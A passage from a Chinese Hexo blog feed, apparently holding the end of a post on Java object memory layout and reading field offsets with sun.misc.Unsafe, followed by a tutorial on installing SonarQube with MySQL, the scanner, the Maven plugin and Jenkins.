vo.a=<span class="number">2</span>;</span><br><span class="line">    vo.b=<span class="number">3</span>;</span><br><span class="line">    vo.d=new HashMap&lt;&gt;();</span><br><span class="line">    long aoffset = unsafe.objectFieldOffset(VO.<span class="keyword">class</span>.getDeclaredField(<span class="string">&quot;a&quot;</span>));</span><br><span class="line">    System.<span class="keyword">out</span>.println(<span class="string">&quot;aoffset=&quot;</span>+aoffset);</span><br><span class="line">    <span class="comment">// 获取a的值</span></span><br><span class="line">    int va = unsafe.getInt(vo, aoffset);</span><br><span class="line">    System.<span class="keyword">out</span>.println(<span class="string">&quot;va=&quot;</span>+va);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> static Unsafe getUnsafeInstance() throws Exception &#123;</span><br><span class="line">    <span class="comment">// 通过反射获取rt.jar下的Unsafe类</span></span><br><span class="line">    Field theUnsafeInstance = Unsafe.<span class="keyword">class</span>.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">    theUnsafeInstance.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// return (Unsafe) theUnsafeInstance.get(null);是等价的</span></span><br><span class="line">    <span class="keyword">return</span> (Unsafe) theUnsafeInstance.<span class="keyword">get</span>(Unsafe.<span class="keyword">class</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在我本地机器测试结果如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Running 64-bit HotSpot VM.</span></span><br><span class="line"><span class="meta"># Using compressed oop with 0-bit shift.</span></span><br><span class="line"><span class="meta"># Using compressed klass with 3-bit shift.</span></span><br><span class="line"><span class="meta"># Objects are 8 bytes aligned.</span></span><br><span class="line"><span class="meta"># Field sizes by type: 4, 1, 1, 2, 2, 4, 4, 8, 8 [bytes]</span></span><br><span class="line"><span class="meta"># Array element sizes: 4, 1, 1, 2, 2, 4, 4, 8, 8 [bytes]</span></span><br><span class="line"></span><br><span class="line">com.ha.net.nsp.product.VO <span class="keyword">object</span> internals:</span><br><span class="line"> OFFSET  SIZE               TYPE DESCRIPTION                               VALUE</span><br><span class="line">      <span class="number">0</span>    <span class="number">12</span>                    (<span class="keyword">object</span> header)                           N/A</span><br><span class="line">     <span class="number">12</span>     <span class="number">4</span>                <span class="keyword">int</span> VO.a                                      N/A</span><br><span class="line">     <span class="number">16</span>     <span class="number">8</span>               <span class="keyword">long</span> VO.b                                      N/A</span><br><span class="line">     <span class="number">24</span>     <span class="number">4</span>                <span class="keyword">int</span> VO.e                                      N/A</span><br><span class="line">     <span class="number">28</span>     <span class="number">1</span>            boolean VO.i                                      N/A</span><br><span class="line">     <span class="number">29</span>     <span class="number">3</span>                    (alignment/padding gap)                  </span><br><span class="line">     <span class="number">32</span>     <span class="number">4</span>   java.lang.String VO.c                                      N/A</span><br><span class="line">     <span class="number">36</span>     <span class="number">4</span>   java.lang.Object VO.d                                      N/A</span><br><span class="line">     <span class="number">40</span>     <span class="number">4</span>   java.lang.Object VO.h                                      N/A</span><br><span class="line">     <span class="number">44</span>     <span class="number">4</span>                    (loss due to the next <span class="keyword">object</span> alignment)</span><br><span class="line">Instance size: <span class="number">48</span> bytes</span><br><span class="line">Space losses: <span class="number">3</span> bytes <span class="keyword">internal</span> + <span class="number">4</span> bytes external = <span class="number">7</span> bytes total</span><br><span class="line"></span><br><span class="line">=================</span><br><span class="line">aoffset=<span class="number">12</span></span><br><span class="line">va=<span class="number">2</span></span><br></pre></td></tr></table></figure><p>在结果中，我们发现：</p><ul><li>1、我本地的虚拟机环境是64位并且开启了compressed压缩，对象都是8字节对齐</li><li>2、VO类的内存布局包含12字节的对象头，4字节的int数据，8字节的long数据，其他String和Object是4字节，最后还有4字节的对齐。</li><li>3、VO类属性的内存布局跟属性声明的顺序不一致。</li><li>4、VO类的static属性不在VO的内存布局中，因为他是属于class类。</li><li>5、通过VO类就可以确定一个对象占用的字节数，这个占用空间在编译阶段就已经确定（注：此占用空间并不是对象的真实占用空间，）。</li><li>6、如上，通过偏移量12就可以读取到此处存放的值是2。</li></ul><p>引申出新的问题：<br> <strong>1、这里的对象头为什么是12字节？对象头里都具体包含什么？</strong><br> 答：正常情况下，对象头在32位系统内占用一个机器码也就是8个字节，64位系统也是占用一个机器码16个字节。但是在我本地环境是开启了reference（指针）压缩，所以只有12个字节。<br> <strong>2、这里的String和Object为什么都是4字节？</strong><br> 答：因为String或者Object类型，在内存布局中，都是reference类型，所以他的大小跟是否启动压缩有关。未启动压缩的时候，32位机器的reference类型是4个字节，64位是8个字节，但是如果启动压缩后，64位机器的reference类型就变成4字节。<br> <strong>3、Java怎么知道应该从偏移量12读取到偏移量16呢，而不是读取到偏移量18或者20？</strong><br> 答：这里我猜测，虚拟机在编译阶段，就已经保留了一个VO类的偏移量数组，那12后的偏移量就是16，所以Java知道读到16为止。</p><p>更多内存布局问题请参考：<br> <a href="https://blog.csdn.net/aitangyong/article/details/46416667">java对象的内存布局(一)：计算java对象占用的内存空间以及java object layout工具的使用</a><br> <a href="http://www.importnew.com/1305.html">Java对象内存结构</a><br> <a href="https://www.cnblogs.com/SaraMoring/p/5713732.html">JVM内存堆布局图解分析</a></p><h2 id="对象头包含什么内容"><a href="#对象头包含什么内容" class="headerlink" title="对象头包含什么内容"></a>对象头包含什么内容</h2><p><a href="https://blog.csdn.net/yinbucheng/article/details/72524482">java中的对象头的解析</a></p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/offset_3.jpg" alt="offset_3"></p><ul><li>1、对象头有几位是锁标志位<br> 可以参考如下文章，对象头跟锁有很重要的关联，并且文章中提到另外一个概念：<strong>Monitor，预留到以后研究</strong><br> <a href="https://mp.weixin.qq.com/s/wHz0uL_LEe4OgLsSFGEZEg">死磕Java并发：深入分析synchronized的实现原理</a></li><li>2、对象头有几位代表分代年龄，与回收算法有关<br> CMS标记-清除回收算法，标记阶段的大概过程是从栈中查找所有的reference类型，递归可达的所有堆内对象的对象头都标记为数据可达，清除阶段是对堆内存从头到尾进行线性遍历，如果发现有对象没有被标识为可到达对象，那么就将此对象占用的内存回收，并且将原来标记为可到达对象的标识清除。<br> 在 gc回收的时候，会更新还存活的对象的对象头的分代年龄，同时如果这些对象还有发生位置移动（碎片清理），那么还要重新计算对象头的hash值，以及栈中相应的reference引用的值。</li></ul><p>说到回收算法，再参考下这篇也更能理解对象的创建和回收：<br> <a href="https://www.zhihu.com/question/21539353/answer/95667088">垃圾回收机制中，引用计数法是如何维护所有对象引用的？</a></p><h2 id="UNSAFE与线程的关系"><a href="#UNSAFE与线程的关系" class="headerlink" title="UNSAFE与线程的关系"></a>UNSAFE与线程的关系</h2><p>unsafe中有一个park方法，与线程挂起有关，<strong>预留到以后研究</strong></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://www.importnew.com/14948.html">一个Java对象到底占多大内存？</a></p><p><a href="https://www.imooc.com/article/20818">JVM内存模型及String对象内存分配</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sonarQube</title>
      <link href="/sonarqubSonar/"/>
      <url>/sonarqubSonar/</url>
      
        <content type="html"><![CDATA[<p>SonarQube 是一款用于代码质量管理的开源工具，它主要用于管理源代码的质量。 通过插件形式，可以支持众多计算机语言，比如 java, C#, go，C/C++, PL/SQL, Cobol, JavaScrip, Groovy 等。sonar可以通过PMD,CheckStyle,Findbugs等等代码规则检测工具来检测你的代码，帮助你发现代码的漏洞，Bug，异味等信息。以下转自自己的CSDN博客：（关于截图背景颜色请无<a href="https://blog.csdn.net/qq_17238449/article/details/97392513">https://blog.csdn.net/qq_17238449/article/details/97392513</a></p><a id="more"></a><h2 id="Sonarqube搭建"><a href="#Sonarqube搭建" class="headerlink" title="Sonarqube搭建"></a>Sonarqube搭建</h2><h3 id="1、安装"><a href="#1、安装" class="headerlink" title="1、安装"></a>1、安装</h3><p>这里准备的是**<em>sonarqube7.7.zip**</em>，我的安装路径是/u02/ycc</p><p>使用unzip解压压缩包；</p><p><strong>预置条件</strong></p><p>1).已安装JAVA环境</p><p>2).已安装有MySQL数据库</p><p>3).sonarQube压缩包</p><h3 id="2、数据库配置："><a href="#2、数据库配置：" class="headerlink" title="2、数据库配置："></a>2、数据库配置：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建数据库sonar</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> sonar <span class="built_in">character</span> <span class="keyword">set</span> utf8 <span class="keyword">collate</span> utf8_general_ci;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建数据库用户sonar可用地址为192.168.6.226密码sonar</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> sonar@<span class="string">&#x27;192.168.6.226&#x27;</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">&#x27;sonar&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 赋权给用户sonar对数据库sonar有所有权限</span></span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">on</span> sonar.* <span class="keyword">to</span> <span class="string">&#x27;sonar&#x27;</span>@<span class="string">&#x27;%&#x27;</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">&#x27;sonar&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 授权sonar用户可以在本地连接数据库</span></span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">on</span> sonar.* <span class="keyword">to</span> <span class="string">&#x27;sonar&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">&#x27;sonar&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 授权sonar用户可以在226连接数据库</span></span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">on</span> sonar.* <span class="keyword">to</span> <span class="string">&#x27;sonar&#x27;</span>@<span class="string">&#x27;192.168.6.226&#x27;</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">&#x27;sonar&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 刷新权限</span></span><br><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/sonarqube_1.png" alt="1564051508551"></p><p><strong>对权限的所有操作最后需要刷新下权限，即flush privileges;使之更改立马生效。</strong></p><h3 id="3、修改sonar配置文件：sonar-properties"><a href="#3、修改sonar配置文件：sonar-properties" class="headerlink" title="3、修改sonar配置文件：sonar.properties"></a>3、修改sonar配置文件：sonar.properties</h3><p><strong>我的数据库在17，使用时更改这个地址到自己的数据库地址即可。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sonar.jdbc.username&#x3D;sonar</span><br><span class="line">sonar.jdbc.password&#x3D;sonar</span><br><span class="line">sonar.jdbc.url&#x3D;jdbc:mysql:&#x2F;&#x2F;192.168.6.17:3306&#x2F;sonar?useUnicode&#x3D;true&amp;characterEncoding&#x3D;utf8&amp;rewriteBatchedStatements&#x3D;true&amp;useConfigs&#x3D;maxPerformance&amp;useSSL</span><br></pre></td></tr></table></figure><p><strong>修改wrapper配置文件的java路径</strong></p><p>wrapper配置文件额sonar.properties在同一个目录里，这里需要注意一点，路径后面需要额外加上/java。不加会报</p><p>Unable to start JVM: Permission denied (13)的错误。</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">wrapper.java.command</span>=<span class="string">/u02/ycc/jdk1.8.0_161/bin/java</span></span><br></pre></td></tr></table></figure><p><strong>启动</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh &#x2F;u02&#x2F;ycc&#x2F;sonar...&#x2F;bin&#x2F;linux...&#x2F;sonar.sh start</span><br></pre></td></tr></table></figure><p>如果使用root的话会出现如下错误：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/sonarqube_2.png" alt="1564098693803"></p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/sonarqube_3.png" alt="1564098711687"></p><p>换个用户，并赋予这个用户sonar目录的权限即可。</p><h3 id="4、启动sonarqube"><a href="#4、启动sonarqube" class="headerlink" title="4、启动sonarqube"></a>4、启动sonarqube</h3><p>  将中文插件sonar-l10n-zh-plugin-1.28.jar复制到extensions/plugins</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/sonarqube_4.png" alt="1564122590906"></p><h3 id="5、安装SonarQube-Scanner和配置"><a href="#5、安装SonarQube-Scanner和配置" class="headerlink" title="5、安装SonarQube Scanner和配置"></a>5、安装SonarQube Scanner和配置</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//解压文件</span><br><span class="line">//进入文件</span><br><span class="line">//编辑文件</span><br><span class="line">[root@localhost local]#unzip  sonar-scanner-cli-3.0.3.778-linux.zip</span><br><span class="line">[root@localhost local]#mv sonar-scanner-cli-3.0.3.778-linux  sonar-scanner</span><br><span class="line">[root@localhost local]# cd sonar-scanner</span><br><span class="line">[root@localhost sonar-scanner]# vim conf/sonar-scanner.properties </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#Configure here general information about the environment, such as SonarQube DB details for example</span><br><span class="line">#No information about specific project should appear here</span><br><span class="line">#----- Default source code encoding</span><br><span class="line">sonar.sourceEncoding&#x3D;UTF-8</span><br><span class="line"> </span><br><span class="line">sonar.host.url&#x3D;http:&#x2F;&#x2F;192.168.6.226:9000</span><br><span class="line">sonar.jdbc.username&#x3D;sonar</span><br><span class="line">sonar.jdbc.password&#x3D;sonar</span><br><span class="line">sonar.jdbc.url&#x3D;jdbc:mysql:&#x2F;&#x2F;192.168.6.17:3306&#x2F;sonar?useUnicode&#x3D;true&amp;characterEncoding&#x3D;utf8</span><br><span class="line">sonar.login&#x3D;sonar</span><br><span class="line">sonar.password&#x3D;sonar</span><br></pre></td></tr></table></figure><p>在项目的根目录创建sonar-project.properties </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#sonar登陆用户</span><br><span class="line">sonar.login&#x3D;admin</span><br><span class="line">#sonar登陆密码</span><br><span class="line">sonar.password&#x3D;admin</span><br><span class="line">#需要扫描的项目对应的key自定义即可</span><br><span class="line">sonar.projectKey&#x3D;content-receive</span><br><span class="line">#需要扫描的项目对应的显示项目名自定义即可</span><br><span class="line">sonar.projectName&#x3D;content-receive</span><br><span class="line">sonar.projectVersion&#x3D;1.0-SNAPSHOT</span><br><span class="line">sonar.sourceEncoding&#x3D;UTF-8</span><br><span class="line">sonar.language&#x3D;java</span><br><span class="line">#扫描的源码位置</span><br><span class="line">sonar.sources&#x3D;src&#x2F;main&#x2F;java&#x2F;com&#x2F;jsc&#x2F;content</span><br><span class="line">#扫描的test位置</span><br><span class="line">sonar.tests&#x3D;src&#x2F;test&#x2F;java&#x2F;com&#x2F;jsc&#x2F;content</span><br><span class="line">#扫描java的源码位置</span><br><span class="line">sonar.java.binaries&#x3D;target&#x2F;classes&#x2F;com&#x2F;jsc&#x2F;content</span><br></pre></td></tr></table></figure><p>在项目当前目录执行scanner ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh &#x2F;sonarscannerdir&#x2F;bin&#x2F;sonar-scanner -X</span><br></pre></td></tr></table></figure><p>运行结束在sonarQube页面即可看到刚才扫描的项目。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/sonarqube_5.png" alt="1564109007362"></p><h3 id="6、maven-sonar-plugin"><a href="#6、maven-sonar-plugin" class="headerlink" title="6、maven-sonar-plugin"></a>6、maven-sonar-plugin</h3><p>对于Maven项目，除了使用SonarQube Scanner进行分析之外，还可以使用maven-sonar-plugin插件进行分析。使用maven-sonar-plugin插件的步骤如下：(setting.xml)</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/sonarqube_6.png" alt="1564110217662"></p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/sonarqube_7.png" alt="1564110205988"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">id</span>&gt;</span>sonar<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sonar.jdbc.url</span>&gt;</span>jdbc:mysql://192.168.6.226:3306/sonar<span class="tag">&lt;/<span class="name">sonar.jdbc.url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sonar.jdbc.username</span>&gt;</span>sonar<span class="tag">&lt;/<span class="name">sonar.jdbc.username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sonar.jdbc.password</span>&gt;</span>sonar<span class="tag">&lt;/<span class="name">sonar.jdbc.password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sonar.host.url</span>&gt;</span>http://192.168.6.226:9000<span class="tag">&lt;/<span class="name">sonar.host.url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">profiles</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">activeProfiles</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">activeProfile</span>&gt;</span>UFindNexus<span class="tag">&lt;/<span class="name">activeProfile</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">activeProfile</span>&gt;</span>sonar<span class="tag">&lt;/<span class="name">activeProfile</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">activeProfiles</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>pom.xml</strong>的<strong>build</strong>中增加如下配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">pluginManagement</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.sonarsource.scanner.maven<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sonar-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">pluginManagement</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在对应项目的控制台输入mvn clean verify sonar:sonar<br>或mvn clean install org.sonarsource.scanner.maven:sonar-maven-plugin:3.1.1:sonar执行扫描；这里注意，如果有多个maven的setting.xml会使用环境变量配置的setting.xml。执行完即可在sonarqube页面查看。</p><p>如果这里执行报错的话可以使用IDEA的run maven运行：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/sonarqube_8.png" alt="1564121819350"></p><p>也可以在pom.xml中增加profile,此时选中sonar-project,执行 clean install sonar:sonar即可。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">profiles</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>sonar-project<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">sonar.jdbc.url</span>&gt;</span>jdbc:mysql://192.168.6.213:3306/sonar<span class="tag">&lt;/<span class="name">sonar.jdbc.url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">sonar.jdbc.username</span>&gt;</span>root<span class="tag">&lt;/<span class="name">sonar.jdbc.username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">sonar.jdbc.password</span>&gt;</span>passok<span class="tag">&lt;/<span class="name">sonar.jdbc.password</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">sonar.host.url</span>&gt;</span>http://192.168.6.213:9000<span class="tag">&lt;/<span class="name">sonar.host.url</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 需要忽略的--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">sonar.exclusions</span>&gt;</span>src/main/java/com/jsc/codec/**<span class="tag">&lt;/<span class="name">sonar.exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profiles</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/sonarqube_9.png" alt="1564121973140"></p><hr><h2 id="Sonarqube使用"><a href="#Sonarqube使用" class="headerlink" title="Sonarqube使用"></a>Sonarqube使用</h2><p>SonarQube 是一个开源的代码分析平台, 用来持续分析和评测项目源代码的质量。 通过SonarQube我们可以检测出项目中重复代码， 潜在bug， 代码规范，安全性漏洞等问题， 并通过SonarQube web UI展示出来。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/sonarqube_10.png" alt="1564124669244"></p><h3 id="1-SonarQube扫描方法"><a href="#1-SonarQube扫描方法" class="headerlink" title="1.SonarQube扫描方法"></a>1.SonarQube扫描方法</h3><p>Jenkins中调用<br>通过jenkins插件调用sonarScanner或使用Maven、Gradle等内置扫描器<br>依据项目需要，对代码持续扫描，并将结果推送到sonarqube 进行页面展示</p><p>SonarQube Scanner<br>使用scanner，通过配置文件，修改项目信息，在命令行中调用scanner工具，进行扫描，并推送给sonarqube</p><p>Maven、Gradle等内置扫描器 </p><p>以maven为例，需要修改maven和sonarqube配置文件，在mvn编译后，使用mvn命令，进行代码扫描，并推送给sonarqube（需要编译源代码） ,参见上文。</p><h3 id="2-SonarQube-web-UI"><a href="#2-SonarQube-web-UI" class="headerlink" title="2.SonarQube web UI"></a>2.SonarQube web UI</h3><p>显示用户所有的项目概况，各项目质量评级，并提供条件筛选 </p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/sonarqube_11.png" alt="1564125155644"></p><h3 id="3-SonarQube-web-UI-–项目页面"><a href="#3-SonarQube-web-UI-–项目页面" class="headerlink" title="3.SonarQube web UI –项目页面"></a>3.SonarQube web UI –项目页面</h3><p>通过在主页面选择单个项目，进入项目详情，该页面提供了当前项目最近一次扫描的结果评级，历史累计和新增问题数量，代码行数等信息 。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/sonarqube_12.png" alt="1564125184892"></p><h3 id="4-SonarQube-web-UI-–问题页面"><a href="#4-SonarQube-web-UI-–问题页面" class="headerlink" title="4.SonarQube web UI –问题页面"></a>4.SonarQube web UI –问题页面</h3><p>提供当前用户名下所有问题的列表，并提供条件筛选，包括问题类型，严重程度等<br>在当个项目中，问题页面显示单项目信息 。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/sonarqube_13.png" alt="1564125329743"></p><p>选中单个问题，查看问题代码详情，sonarqube给出问题描述和修改意见 。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/sonarqube_14.png" alt="1564125632530"></p><h3 id="5-SonarQube-web-UI-–评估页面"><a href="#5-SonarQube-web-UI-–评估页面" class="headerlink" title="5.SonarQube web UI –评估页面"></a>5.SonarQube web UI –评估页面</h3><p>给出当前项目的评估概况信息，大小，可靠性，重复率，覆盖率等 。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/sonarqube_15.png" alt="1564125742365"></p><h3 id="6-SonarQube-web-UI-–代码页面"><a href="#6-SonarQube-web-UI-–代码页面" class="headerlink" title="6.SonarQube web UI –代码页面"></a>6.SonarQube web UI –代码页面</h3><p>以.java文件为依据，给出各个.java文件统计信息 。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/sonarqube_16.png" alt="1564126037590"></p><h3 id="7-SonarQube-web-UI-–活动页面"><a href="#7-SonarQube-web-UI-–活动页面" class="headerlink" title="7.SonarQube web UI –活动页面"></a>7.SonarQube web UI –活动页面</h3><p>页面展示了每次代码扫描的基本信息和代码情况的折线图，折线图可以根据需要调整显示bugs数量，代码行数，覆盖率等信息 。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/sonarqube_167.png" alt="1564126123324"></p><hr><h2 id="SonarQube-Jekins集成"><a href="#SonarQube-Jekins集成" class="headerlink" title="SonarQube Jekins集成"></a>SonarQube Jekins集成</h2><h3 id="1、安装jenkins-sonar插件。"><a href="#1、安装jenkins-sonar插件。" class="headerlink" title="1、安装jenkins sonar插件。"></a>1、安装jenkins sonar插件。</h3><p>略</p><h3 id="2、配置sonarServer"><a href="#2、配置sonarServer" class="headerlink" title="2、配置sonarServer"></a>2、配置sonarServer</h3><p>进入系统管理–&gt;系统配置界面。(这里选择测试环境的sonarQube地址)</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/sonarqube_18.png" alt="1564123349587"></p><p>进入系统管理–&gt;全局工具配置</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/sonarqube_19.png" alt="1564123462680"></p><h3 id="3、构建项目"><a href="#3、构建项目" class="headerlink" 